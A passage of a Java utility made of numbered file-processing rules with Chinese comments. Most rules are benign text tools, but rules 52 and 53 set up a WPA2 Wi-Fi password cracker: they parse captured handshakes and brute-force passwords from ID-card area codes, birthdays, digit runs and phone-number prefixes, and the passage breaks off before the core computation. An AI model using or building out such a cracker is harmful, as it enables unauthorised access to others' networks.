								}

								if(varItem.contains("}")) {
									String var_name = varItem.trim().substring(0,varItem.indexOf("}"));

									if(var_name.contains(" ")) {  // 如果 变量名称中 含有 空格那么 就不打印它了
										continue;
									}

									String echo_var_command =  "echo zukgit_"+file_name+"_"+echo_count+"_"+operation_timestamp+"  "+"  "+"\"$ {"+var_name+"}=${"+var_name+"}\"";
									echo_count++;
//									newListContent.add(echo_var_command);
									var_list.add(echo_var_command);


								}
							}

							if(pre_one_line != null && pre_one_line.endsWith("\\")) {
								// 如果 当前行的上一行 是 \ 结尾的话  当前行 说明是多行的最后一行 那么先输出当前行 再 打印
								newListContent.add(newOneLine);
								newListContent.addAll(var_list);

							}else {
								// 先打印  再 输出
								newListContent.addAll(var_list);
								newListContent.add(newOneLine);
							}

							continue;
						}

						//5.
						// generate_product_graph $NINJA_BUILD_FILE $MSI_TARGET  没有 括号 扩起的 变量
						if(newOneLine.contains("$") && !newOneLine.contains("${") && !newOneLine.contains(")")   ) {
							String[] var_arr = newOneLine.split("\\$");
							if(var_arr == null) {
								newListContent.add(newOneLine);
								continue;
							}



							for (int i = 0; i < var_arr.length; i++) {
								String varItem = var_arr[i]+" ";

								if(i == 0) {   // 第一个分隔项 是 没有匹配的
									continue;
								}

								String var_name = "";
								if(varItem.contains(" ")) {
									var_name = varItem.trim().substring(0,varItem.indexOf(" "));


									if(var_name.contains(" ") || var_name.contains("/") || var_name.contains(".") ) {  // 如果 变量名称中 含有 空格那么 就不打印它了
										continue;
									}
									var_name = var_name.replace("\\", "").replace("/", "").replace("\"", "").replace(",", "").replace(" ", "");
									String echo_var_command =  "echo zukgit_"+file_name+"_"+echo_count+"_"+operation_timestamp+"  "+"  "+"\"$ {"+var_name+"}=${"+var_name+"}\"";
									echo_count++;
									newListContent.add(echo_var_command);

								}
							}
							newListContent.add(newOneLine);
							continue;


						}



						newListContent.add(newOneLine.trim());
					}
					curBR.close();

				} catch (IOException e) {
					e.printStackTrace();
				}
			} else {
				System.out.println("Failed !");
			}
			return newListContent;
		}


		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}



	class Bash_Var_To_Echo_Rule_58 extends Basic_Rule {


		@Override
		String simpleDesc() {
			return "  把当前文件的每一行 等号前的变量 gen_fact_package=0 都 转为 Linux-bash的输出 echo \"$ {gen_fact_package}=${gen_fact_package}\"  ";
		}

		Bash_Var_To_Echo_Rule_58() {
			super(58, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				ArrayList<String> fixedStrArr = Linxu_Var_Echo_Method(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的 等号表达式=  都 转为 echo ${ var } = ${var} 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}




		public  ArrayList<String> Linxu_Var_Echo_Method(File srcFile) {
			ArrayList<String> newContent = new ArrayList<String>();

			File curFile = srcFile;

			if (curFile != null) {

				FileReader curReader;
				try {

					curReader = new FileReader(curFile);

					BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
					String oldOneLine = "";
					String newOneLine = "";

					while (oldOneLine != null) {

						oldOneLine = curBR.readLine();
						if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
							//	newContent.add("System.out.println();");
							continue;
						}

//	                    System.out.println(" \"this is test string\" ");
//	                    System.out.println("adb shell am broadcast -a com.Android.test --es<string> test_string \"this is test string\" —ei<int> test_int 100 —ez<boolean> test_boolean true");
						newOneLine = new String(oldOneLine).trim();


						// 只对 包含 = 等号的 变量进行输出
						if(!newOneLine.contains("=")) {
							continue;
						}

						String equal_var_str = newOneLine.substring(0,newOneLine.indexOf("=")).trim();

						// echo "$ {gen_fact_package}=${gen_fact_package}"

						String echo_command = "echo \"$ {"+equal_var_str+"}=${"+equal_var_str+"}\"";


						newContent.add(echo_command.trim());
					}
					curBR.close();

				} catch (IOException e) {
					e.printStackTrace();
				}
			} else {
				System.out.println("Failed !");
			}
			return newContent;
		}


		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}


	class RealFile_To_MD_CodeBlock_Rule_57 extends Basic_Rule {
		ArrayList<String> allMD_Content;

		RealFile_To_MD_CodeBlock_Rule_57() {
			super(57, false);
			allMD_Content = new ArrayList<String>();

		}

		boolean  isFile_In_MD(File realFile) {


			boolean flag = false ;


			File mDir_SubFile = realFile;

			if (mDir_SubFile == null || mDir_SubFile.isDirectory()) {
				return flag ;
			}

			String filename_lowwer = mDir_SubFile.getName().toLowerCase();

			if (filename_lowwer.endsWith(".txt")
					||	filename_lowwer.endsWith(".h")
					||	filename_lowwer.endsWith(".c")
					||	filename_lowwer.endsWith(".sh")
					||	filename_lowwer.endsWith(".mk")
					||	filename_lowwer.endsWith(".cpp")
					||	filename_lowwer.endsWith(".java")

			) {
				return true ;
			}


			return flag ;

		}

		@Override
		String simpleDesc() {
			return "读取当前目录 txt .cpp .c .java  文件内容进行集合整理成 MD 文件类型 ## 行数 ```code```格式输出 ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			System.out.println("执行 规则:"+rule_index+" 的 applyOperationRule 方法!  curInputFileList.size()="+curInputFileList.size());
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				File cur_txt_dir_file = fileItem.getParentFile();

				if (cur_txt_dir_file == null || !cur_txt_dir_file.exists()) {
					System.out.println("当前的 txt文件的父目录不存在 请检查! txt_fileItem=" + fileItem + "    cur_txt_dir_file="
							+ cur_txt_dir_file);

					return null;
				}

				System.out.println("当前的  txt_fileItem=" + fileItem + "    cur_txt_dir_file="
						+ cur_txt_dir_file);

				File[] all_sub_file_arr = cur_txt_dir_file.listFiles();

				if (all_sub_file_arr == null) {
					System.out.println("当前的 txt文件的父目录为空  请检查! txt_fileItem=" + fileItem + "    cur_txt_dir_file="
							+ cur_txt_dir_file + "   all_sub_file_arr=" + all_sub_file_arr);

					return null;
				}

				ArrayList<File> avaliable_file_list = new ArrayList<File>();


				for (int j = 0; j < all_sub_file_arr.length; j++) {
					File fileItem_temp = all_sub_file_arr[j];

					if(fileItem_temp.isFile() ) {

						avaliable_file_list.add(fileItem_temp);
					}
				}

				avaliable_file_list.sort(new Comparator<File>() {
					@Override
					public int compare(File o1, File o2) {
						if(o1.length() > o2.length()) {

							return -1;
						}

						if(o1.length() < o2.length()) {

							return 1;
						}

						if(o1.length() == o2.length()) {

							return -1;
						}

						return 1;
					}
				});




				System.out.println("当前的  avaliable_file_list  =" + avaliable_file_list );

				for (int j = 0; j < avaliable_file_list.size(); j++) {
					File mDir_SubFile = avaliable_file_list.get(j);

					if (mDir_SubFile == null || mDir_SubFile.isDirectory()) {
						continue;
					}
					boolean is_need_write_md =  isFile_In_MD(mDir_SubFile);
					System.out.println("当前的  mDir_SubFile["+j+"]  =" + mDir_SubFile +"  is_need_write_md="+is_need_write_md );
					if (!is_need_write_md) {
						continue;
					}

					ArrayList<String> txtFileList = ReadFileContentAsList(mDir_SubFile);
					System.out.println("当前的  mDir_SubFile["+j+"]  =" + mDir_SubFile +"  txtFileList="+txtFileList );


					ArrayList<String> mdContentList = 	addCodeBlock_To_MD(mDir_SubFile,txtFileList);

					if(mdContentList != null ) {
						allMD_Content.addAll(mdContentList);
					}

					System.out.println("当前的  mDir_SubFile["+j+"]  =" + mDir_SubFile +"  txtFileList="+txtFileList );


				}



				for (int j = 0; j < allMD_Content.size(); j++) {
					String line_str = allMD_Content.get(j);
					System.out.println("line[" + (j + 1) + "] = " + line_str);

				}

				writeContentToFile(I9_Temp_Text_File, allMD_Content);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}


		ArrayList<String>  addCodeBlock_To_MD(File realFile , ArrayList<String> lineList) {

			ArrayList<String> codeBlockList =  new ArrayList<String>();

			int fileRow_Count  = lineList.size();
			String file_name = realFile.getName();


			String HeadTip = "###  "+ realFile.getName()+"("+fileRow_Count+")";

			codeBlockList.add(HeadTip);
			codeBlockList.add("");
			codeBlockList.add("```");
			codeBlockList.addAll(lineList);
			codeBlockList.add("```");
			codeBlockList.add("");

			return codeBlockList ;
		}

	}


	class MD_File_Head_JingHao_AddIndex_Rule_56 extends Basic_Rule {


		MD_File_Head_JingHao_AddIndex_Rule_56() {
			super(56, false);

		}

		// 1. 完成参数的 自我客制化 实现 checkParamsOK 方法

		// 2. 对应的逻辑方法 实现方法 applyOperationRule

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				if(!fileItem.getName().toLowerCase().endsWith(".md")) {   // 只对  md 文件操作
					continue;
				}
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = Make_JingHao_Add_Index(contentList);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_"+rule_index+" -> 把当前文件加入 Head# 井号 添加索引   File=" + fileItem.getAbsolutePath());
			}
			System.out.println("rule_"+rule_index+" -> 把当前文件加入 Head# 井号 添加索引  执行完成" );
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		ArrayList<String> Make_JingHao_Add_Index(ArrayList<String>  contentList){
			ArrayList<String> addJingHaoList  = new ArrayList<String>();

			for (int i = 0; i < contentList.size(); i++) {
				String one_line_str = contentList.get(i);
				if(one_line_str.startsWith("#")) {

					String new_line_str = operation_add_JingHao_Index(one_line_str);
					addJingHaoList.add(new_line_str);
					continue;
				}

				addJingHaoList.add(one_line_str);

			}


			return addJingHaoList;


		}


		String operation_add_JingHao_Index(String rawHeadStr) {
			String headLine =  rawHeadStr;
			String clear_jing_str = headLine.replace("#", "").trim();

			System.out.println("rawLine = "+rawHeadStr);
			if(clear_jing_str.startsWith("1_")) {
				clear_jing_str = clear_jing_str.replace("1_","");
			} else		if(clear_jing_str.startsWith("2_")) {
				clear_jing_str = clear_jing_str.replace("2_","");
			} else		if(clear_jing_str.startsWith("3_")) {
				clear_jing_str = clear_jing_str.replace("3_","");
			} else		if(clear_jing_str.startsWith("4_")) {
				clear_jing_str = clear_jing_str.replace("4_","");
			} else		if(clear_jing_str.startsWith("5_")) {
				clear_jing_str = clear_jing_str.replace("5_","");
			} else		if(clear_jing_str.startsWith("6_")) {
				clear_jing_str = clear_jing_str.replace("6_","");
			}

			System.out.println("A1_clear_jing_str = "+clear_jing_str);

			// 需要 处理 原始存在在  1.  2.  3.  4.  5.  6. 这样的情况

			if(headLine.startsWith("######")) { // 6

				headLine = "###### "+"6_"+clear_jing_str;

			} else 			if(headLine.startsWith("#####")) { // 5
				headLine = "##### "+"5_"+clear_jing_str;

			}else 			if(headLine.startsWith("####")) { // 4

				headLine = "#### "+"4_"+clear_jing_str;
			}else 			if(headLine.startsWith("###")) { // 3

				headLine = "### "+"3_"+clear_jing_str;
			}else 			if(headLine.startsWith("##")) { // 2
				headLine = "## "+"2_"+clear_jing_str;

			}else 			if(headLine.startsWith("#")) { // 1
				headLine = "# "+"1_"+clear_jing_str;

			}
			System.out.println("A2_headLine = "+headLine);

			return headLine;

		}

		@Override
		String simpleDesc() {
			return " 在当前的 md 文件中 把 # 号 里面 转为 # 1.  ##转为 ## 2. 添加顺序索引";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}


	class PcaPng_TXT_WifiFrame_ByteShow_Rule_52 extends Basic_Rule {

		File pcapng_txt_analysis_file;
		File pcapng_wififrame_file; // 密码是 LINUXZSJ

		// I9_beacon_eapol_pwd-cesarwisl.pcapng 密码是 cesarwisl
		File pcapng_eap_beacon_frame_file;

		File I9_wpa2_crack_rule53_pwd_dictionary_file;


		PcaPng_TXT_WifiFrame_ByteShow_Rule_52() {
			super(52, false);

			pcapng_txt_analysis_file = new File(zbinPath + File.separator + "I9_wpa2_eapol_analysis.txt");

			pcapng_wififrame_file = new File(zbinPath + File.separator + "I9_wpa2_beacon_eapol_pwd-LINUXZSJ.pcapng");

			pcapng_eap_beacon_frame_file = new File(
					zbinPath + File.separator + "I9_wpa2_beacon_eapol_pwd-cesarwisl.pcapng");

			I9_wpa2_crack_rule53_pwd_dictionary_file = new File(
					zbinPath + File.separator + "I9_wpa2_crack_rule53_pwd_dictionary.txt");


		}

		@Override
		String simpleDesc() {
			return "打开 研究 WIFI EAPOL 交互帧研究的 txt 文件 和 pcapng 文件 ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				System.out.println("打开  wifi pcapng eapol 帧 研究 txt文件:");
				System.out.println(pcapng_txt_analysis_file.getAbsolutePath());
				System.out.println();
				System.out.println("打开  wifi pcapng eapol 帧 研究 pcapng文件:");
				System.out.println(pcapng_wififrame_file.getAbsolutePath());

				if (pcapng_txt_analysis_file.exists()) {
					NotePadOpenTargetFile(pcapng_txt_analysis_file.getAbsolutePath());
				}

				if (I9_wpa2_crack_rule53_pwd_dictionary_file.exists()) {
					NotePadOpenTargetFile(I9_wpa2_crack_rule53_pwd_dictionary_file.getAbsolutePath());
				}


				if (pcapng_wififrame_file.exists()) {
					execCMD(pcapng_wififrame_file.getAbsolutePath());
				}

				if (pcapng_eap_beacon_frame_file.exists()) {
					execCMD(pcapng_eap_beacon_frame_file.getAbsolutePath());
				}




			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

	}

	// 当前 txt 文件内容的 twitter的 id 进行集合
	class Twitter_ID_Search_Rule_54 extends Basic_Rule {

		ArrayList<String> tw_id_list;

		Twitter_ID_Search_Rule_54() {
			super(54, false);
			tw_id_list = new ArrayList<String>();

		}

		@Override
		String simpleDesc() {
			return "当前 txt 文件内容 以及同目录的txt文件 的 twitter的  id 进行集合整理成 ```md```格式输出 ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				File cur_txt_dir_file = fileItem.getParentFile();

				if (cur_txt_dir_file == null || !cur_txt_dir_file.exists()) {
					System.out.println("当前的 txt文件的父目录不存在 请检查! txt_fileItem=" + fileItem + "    cur_txt_dir_file="
							+ cur_txt_dir_file);

					return null;
				}

				File[] all_sub_file_arr = cur_txt_dir_file.listFiles();

				if (all_sub_file_arr == null) {
					System.out.println("当前的 txt文件的父目录为空  请检查! txt_fileItem=" + fileItem + "    cur_txt_dir_file="
							+ cur_txt_dir_file + "   all_sub_file_arr=" + all_sub_file_arr);

					return null;
				}

				for (int j = 0; j < all_sub_file_arr.length; j++) {
					File mDir_SubFile = all_sub_file_arr[j];

					if (mDir_SubFile == null || mDir_SubFile.isDirectory()) {
						continue;
					}

					if (!mDir_SubFile.getName().toLowerCase().endsWith(".txt")) {
						continue;
					}

					ArrayList<String> txtFileList = ReadFileContentAsList(mDir_SubFile);

					twitter_id_search(txtFileList);

				}

				// ```
				// id
				// ``` 包裹 起来的 id
				ArrayList<String> md5_id_code_list = new ArrayList<String>();
				System.out.println("tw_id_list.size() = " + tw_id_list.size());
				for (int j = 0; j < tw_id_list.size(); j++) {
					String tw_id = tw_id_list.get(j);
					System.out.println("id[" + (j + 1) + "] = " + tw_id);

					md5_id_code_list.add("```");
					md5_id_code_list.add(tw_id);
					md5_id_code_list.add("```");
					md5_id_code_list.add("");
				}

				writeContentToFile(I9_Temp_Text_File, md5_id_code_list);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		// https://twitter.com/JulianRoepcke/status/
		void twitter_id_search(ArrayList<String> lineList) {

			for (int i = 0; i < lineList.size(); i++) {
				String mOneLineStr = lineList.get(i).trim();

				if (mOneLineStr.contains("https://twitter.com") && mOneLineStr.contains("status")) {

					String match_id = getSubString_WithPre_WithEnd(mOneLineStr, "https://twitter.com", "status");

					match_id = match_id.replace("https://twitter.com", "");
					match_id = match_id.replace("/status", "");
					match_id = match_id.replace("/", "");
					if (match_id != null && !tw_id_list.contains(match_id)) {

						tw_id_list.add(match_id);
					}

				}

			}

		}

	}


	// 破解 程序 执行的 order 顺序
	public  static String Rule_53_Input_SSID_Str = "12345";
	public  static String Rule_53_Input_BSSID_Str = "12345";

	public  static String Rule_53_Crack_Order_Default = "12345";
	public  static int  namechar_2_3_areacode6_order1 = 1; // 名字+6位areacode   一千万数据
	public  static int  digital_8_number_order2 = 2;  // 纯8位数字  一亿数据
	public  static int  namechar_2_3_birthday6_order3 = 3;  // 姓氏+ 生日日期  1千两百万 + 3亿
	public  static int  digital_9_number_order4 = 4;  // 纯9位数字  十亿数据
	public  static int  tel_11_number_order5 = 5;  // 电话号码  40*  四十亿

	public  static int  Rule_53_Thread_Count = 100; // 破解 WIFI的 默认的线程个数



	static File Rule_53_wp2_password_dictionary_file; // wpa2的 密码字典 I9_wpa2_crack_rule53_pwd_dictionary.txt


	// .pcapng wifi 包 文件解析 对wifi包的分析 待开发
	class PcaPng_Wifi_Frame_Analysis_Rule_53 extends Basic_Rule {

		File pacapng_file;
		BufferedInputStream pcapng_bis;
		volatile int mFile_CurSor_Position = 0; // 当前 索引的位置

		static final int Block_Type_Length = 4;
		static final int Block_Head_Total_Length = 4;
		// 每次都要读 8 个字节 包含 type 和 block total length
		static final int Block_Type_And_Head_Total_Length = Block_Type_Length + Block_Head_Total_Length;

		static final int Block_Tail_Total_Length = 4;

		ArrayList<Wifi_Crack_Info_Struct> wifiCrackInfoList; // 可以进行 破解密码的 配对帧信息集合
		ArrayList<String> wifiCrack_BSSID_InfoList;  // 用于 确保 wifiCrackInfoList 唯一 标识的集合

		ArrayList<Wifi_Frame_AbsCommon_Struct> wifiFrameStructList; // 帧解析的集合

		ArrayList<Wifi_Frame_AbsCommon_Struct> wifiEapolFrameStructList; // EAPOL 帧的集合

		// beacon 唯一标识 ssid-chanelhz-bssid 唯一标识
		ArrayList<Wifi_Frame_AbsCommon_Struct> wifiBeaconFrameStructList; // EAPOL 帧的集合
		ArrayList<String> wifiBeaconIdetifyList; // beacon 唯一标识 ssid-chanelhz-bssid

		File area_policy_code_file; // 身份证 前6位 列表 I9_wp2_crack_rule53_areacode.txt

		ArrayList<String> area_policy_code_list;
		ArrayList<String> wp2_password_dictionary_list;
		CountDownLatch mCountDownLatch;

		ArrayList<String> tel_number_begin_3num_list; // 电话号码开头的三位
		ArrayList<String> tel_number_pre_5num_list; // 电话号码前面的七位

		String input_ssid_str ;   // 外部输入的 ssid
		byte[] input_ssid_str_bytearr;
		String input_bssid_str ;   // 外部输入的 bssid
		byte[] input_bssid_str_bytearr;
		PcaPng_Wifi_Frame_Analysis_Rule_53() {
			super(53, false);
			wifiFrameStructList = new ArrayList<Wifi_Frame_AbsCommon_Struct>();
			wifiEapolFrameStructList = new ArrayList<Wifi_Frame_AbsCommon_Struct>();
			wifiBeaconFrameStructList = new ArrayList<Wifi_Frame_AbsCommon_Struct>();
			wifiBeaconIdetifyList = new ArrayList<String>();
			wifiCrackInfoList = new ArrayList<Wifi_Crack_Info_Struct>();

			wifiCrack_BSSID_InfoList  = new ArrayList<String>();


		}

		@Override
		void init_pre_params(ArrayList<String> preParamList) {
			// TODO Auto-generated method stub


			// 53_crackorder_2  Rule_53_Crack_Order_Default = "12345";

			String crackorder_prefix = rule_index+"_"+"crackorder_" ;



			String threadcount_prefix = rule_index+"_"+"threadcount_" ;


			String ssid_prefix = rule_index+"_"+"ssid_" ;


			String bssid_prefix = rule_index+"_"+"bssid_" ;

			for (int i = 0; i < preParamList.size(); i++) {
				String pre_param = preParamList.get(i);

				if(pre_param.startsWith(crackorder_prefix)) {
					String crackorder_preparam = pre_param.replace(crackorder_prefix, "").trim();
					Rule_53_Crack_Order_Default = crackorder_preparam;
					System.out.println("Crack 的执行规则 序列为: "+ crackorder_preparam);

				}

				if(pre_param.startsWith(ssid_prefix)) {
					String ssid_input = pre_param.replace(ssid_prefix, "").trim();

					ssid_input = ssid_input.replace("_z_", " ").trim();

					// 由于 输入的 ssid 可能 包含空格  , 传入空格会使得程序 当做另外的参数  使用 _z_ 来代替 空格
					Rule_53_Input_SSID_Str = ssid_input;
					System.out.println("Crack 外部输入的 SSID为 : "+ Rule_53_Input_SSID_Str);
					input_ssid_str = Rule_53_Input_SSID_Str;
					try {
						input_ssid_str_bytearr = input_ssid_str.getBytes("UTF-8");
					} catch (UnsupportedEncodingException e) {

						// TODO Auto-generated catch block

						e.printStackTrace();

					}

				}


				if(pre_param.startsWith(bssid_prefix)) {
					String bssid_input = pre_param.replace(bssid_prefix, "").trim();
					Rule_53_Input_BSSID_Str = bssid_input;
					if(Rule_53_Input_BSSID_Str.length() == 12) {

						System.out.println("Crack 外部输入的 BSSID为 : "+ Rule_53_Input_BSSID_Str);
						input_bssid_str = Rule_53_Input_BSSID_Str;


						input_bssid_str_bytearr = HexStrToBytes(input_bssid_str);

					}else {
						System.out.println("Crack 外部输入的 BSSID为 : "+ bssid_input+"=["+bssid_input.length()+"]   长度不足12 无法组成6字节Mac地址 请检查!");
					}

				}





				if(pre_param.startsWith(threadcount_prefix)) {
					String threadcount_preparam = pre_param.replace(threadcount_prefix, "").trim();
					if(isNumeric(threadcount_preparam)) {

						int threadcount_preparam_int = Integer.parseInt(threadcount_preparam);
						if(threadcount_preparam_int > 0 ) {
							Rule_53_Thread_Count = threadcount_preparam_int;
						}

						System.out.println("Crack 的执行线程 个数为: "+ Rule_53_Thread_Count);

					}


				}



			}


			super.init_pre_params(preParamList);
		}



		void init_tel_number() {
			tel_number_begin_3num_list = new ArrayList<String>();
			tel_number_pre_5num_list = new ArrayList<String>();

			tel_number_begin_3num_list.add("130");
			tel_number_begin_3num_list.add("131");
			tel_number_begin_3num_list.add("132");
			tel_number_begin_3num_list.add("133");
			tel_number_begin_3num_list.add("134");
			tel_number_begin_3num_list.add("135");
			tel_number_begin_3num_list.add("136");
			tel_number_begin_3num_list.add("137");
			tel_number_begin_3num_list.add("138");
			tel_number_begin_3num_list.add("139");
			tel_number_begin_3num_list.add("145");
			tel_number_begin_3num_list.add("147");
			tel_number_begin_3num_list.add("149");
			tel_number_begin_3num_list.add("150");
			tel_number_begin_3num_list.add("151");
			tel_number_begin_3num_list.add("152");
			tel_number_begin_3num_list.add("153");
			tel_number_begin_3num_list.add("155");
			tel_number_begin_3num_list.add("156");
			tel_number_begin_3num_list.add("157");
			tel_number_begin_3num_list.add("158");
			tel_number_begin_3num_list.add("159");
			tel_number_begin_3num_list.add("170");
			tel_number_begin_3num_list.add("171");
			tel_number_begin_3num_list.add("173");
			tel_number_begin_3num_list.add("175");
			tel_number_begin_3num_list.add("176");
			tel_number_begin_3num_list.add("177");
			tel_number_begin_3num_list.add("178");
			tel_number_begin_3num_list.add("180");
			tel_number_begin_3num_list.add("181");
			tel_number_begin_3num_list.add("182");
			tel_number_begin_3num_list.add("183");
			tel_number_begin_3num_list.add("184");
			tel_number_begin_3num_list.add("185");
			tel_number_begin_3num_list.add("186");
			tel_number_begin_3num_list.add("187");
			tel_number_begin_3num_list.add("188");
			tel_number_begin_3num_list.add("189");

			for (int i = 0; i < tel_number_begin_3num_list.size(); i++) {
				String pre3_str = tel_number_begin_3num_list.get(i);

				for (int j = 0; j < 100; j++) {
					String padding_2_num_str = getMatchLength_NumStr(j, 2);
//                    System.out.println("pre5_num = "+ (pre3_str + padding_2_num_str));
					tel_number_pre_5num_list.add(pre3_str + padding_2_num_str);
				}

			}

			System.out.println("填充号码结束!");
		}

		@Override
		String simpleDesc() {
			String preparam_thread = " "+rule_index+"_"+"threadcount_10";
			String preparam_crackorder = " "+rule_index+"_"+"crackorder_2";
			String preparam_ssid_input = " "+rule_index+"_"+"ssid_TP-LINK_4F6C90";
			String preparam_bssid_input = " "+rule_index+"_"+"bssid_20dce64f6c90";


			String preparam_selected = " "+rule_index+"_"+"frameno_2";
			String preparam_ssidmod = " "+rule_index+"_"+"ssidmod_CMCC";
			String preparam_bssidmod = " "+rule_index+"_"+"bssidmod_ffffffff";
			StringBuilder preParamSB = new StringBuilder();
			preParamSB.append(preparam_thread).append(preparam_crackorder).append(preparam_ssid_input).append(preparam_bssid_input).append(preparam_ssidmod).append(preparam_bssidmod).append(preParamSB);
			String preparam_thread_tip = "thread【设置破解线程个数】";
			String preparam_crackorder_tip = "crackorder【设置破解密码类型 1.名字+6位areacode 2.8位数字 3.姓氏+ 生日 4.9位数字 5.11位号码】";
			String preparam_ssidmod_tip = "ssid【ssid为指定字符串 _z_代替空格】";
			String preparam_selected_tip = "bssid【热点的mac地址】";

			StringBuilder preParamSB_tip = new StringBuilder();
			preParamSB_tip.append("                  ## "+preparam_thread_tip+preparam_crackorder_tip+preparam_selected_tip+preparam_ssidmod_tip);

			return ".pcapng  beacon-eap wifi帧 匹配并暴力破解 8_9位纯数字 姓名+生日 + wifi明文字典 I9_wpa2_crack_rule53_pwd_dictionary.txt 破解  预置参数 \n"+
					Cur_Bat_Name+" "+"default_index_"+rule_index + preParamSB.toString() +"\n" +
					Cur_Bat_Name+" "+"default_index_"+rule_index+ " "+preParamSB_tip.toString() +"\n" +
					"";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			area_policy_code_file = new File(zbinPath + File.separator + "I9_wp2_crack_rule53_areacode.txt");
			Rule_53_wp2_password_dictionary_file = new File(
					zbinPath + File.separator + "I9_wpa2_crack_rule53_pwd_dictionary.txt");

			area_policy_code_list = ReadFileContentAsList(area_policy_code_file);
			wp2_password_dictionary_list = ReadFileContentAsList(Rule_53_wp2_password_dictionary_file);

			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				File cur_txt_dir_file = fileItem.getParentFile();

				if (cur_txt_dir_file == null || !cur_txt_dir_file.exists()) {
					System.out.println("当前的 txt文件的父目录不存在 请检查! txt_fileItem=" + fileItem + "    cur_txt_dir_file="
							+ cur_txt_dir_file);

					return null;
				}

				if (!fileItem.getName().toLowerCase().endsWith(".pcapng")) {

					System.out
							.println("当前的 输入文件 不是  .pcapng 文件 请检查! fileItem=" + fileItem + "    fileItem=" + fileItem);

					return null;
				}

				pacapng_file = fileItem;

				try {
